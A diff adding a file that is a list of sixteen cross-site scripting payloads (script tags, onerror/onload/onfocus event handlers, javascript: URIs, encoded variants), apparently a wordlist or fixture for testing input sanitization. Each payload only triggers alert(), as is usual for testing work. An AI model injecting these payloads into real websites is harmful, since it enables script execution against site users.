@@ -1,0 +1,16 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+javascript:alert('XSS')
+<iframe src='javascript:alert("XSS")'></iframe>
+'\"><script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert`XSS`</script>
+<img src='x' onerror='alert(1)'>
+<svg><script>alert&#40;1&#41;</script>
+<body onload=alert('XSS')>
+<input autofocus onfocus=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<audio src=x onerror=alert(1)>
